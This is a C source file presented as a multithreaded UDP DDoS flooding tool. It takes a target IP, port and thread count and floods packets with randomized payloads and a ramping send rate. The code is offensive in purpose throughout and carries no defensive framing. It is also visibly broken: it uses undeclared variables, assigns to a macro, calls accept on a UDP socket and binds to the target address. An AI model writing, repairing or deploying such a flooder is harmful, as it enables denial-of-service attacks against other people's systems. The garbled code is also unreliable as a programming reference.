#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>

#define MAX_CLIENTS 5000
#define BUFFER_SIZE 4096
#define ATTACK_DURATION 300 // seconds
#define PACKET_SIZE 1500
#define INITIAL_RATE 10000 // packets per second

int sock, client_socks[MAX_CLIENTS], max_clients = 0;
struct sockaddr_in server_addr, client_addr;
socklen_t sin_size = sizeof(struct sockaddr_in);
char buffer[BUFFER_SIZE];
unsigned short port;
int thread_count;

void* attack_thread(void* arg) {
    int client_sock = *(int*)arg;
    char packet[PACKET_SIZE];
    
    while (thread_count > 0 && clock() - start_time < attack_duration * CLOCKS_PER_SEC) {
        sendto(client_sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
        
        // Randomize packet size and content
        int packet_size = rand() % (PACKET_SIZE - 100) + 100;
        char* payload = malloc(packet_size);
        for (int i = 0; i < packet_size; i++) {
            payload[i] = rand() % 256;
        }
        
        sendto(client_sock, payload, packet_size, 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
        
        free(payload);
    }
    
    close(client_sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <THREAD_COUNT>\n", argv[0]);
        exit(1);
    }

    inet_aton(argv[1], &server_addr.sin_addr);
    port = htons((unsigned short)atoi(argv[2]));
    thread_count = atoi(argv[3]);

    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == -1) {
        perror("Socket creation failed");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = port;
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Bind socket
    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Socket binding failed");
        exit(1);
    }

    printf("UDP DDoS attack started. Press Ctrl+C to stop.\n");

    pthread_t threads[MAX_CLIENTS];
    clock_t start_time = clock();

    for (int i = 0; i < thread_count; i++) {
        client_socks[max_clients] = accept(sock, (struct sockaddr*)&client_addr, &sin_size);
        if (client_socks[max_clients] < 0) {
            perror("Accept failed");
            continue;
        }

        max_clients++;
        if (max_clients >= MAX_CLIENTS) {
            close(client_socks[0]);
            max_clients--;
        }

        pthread_create(&threads[i], NULL, attack_thread, &client_socks[max_clients - 1]);
    }

    // Randomize initial rate
    INITIAL_RATE = rand() % 20000 + 5000;

    while (clock() - start_time < attack_duration * CLOCKS_PER_SEC) {
        sleep(1);
        
        // Increase packet rate over time
        int current_rate = INITIAL_RATE + ((clock() - start_time) / CLOCKS_PER_SEC * 1000);
        current_rate = (current_rate > MAX_RATE) ? MAX_RATE : current_rate;
        
        sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    close(sock);

    return 0;
}
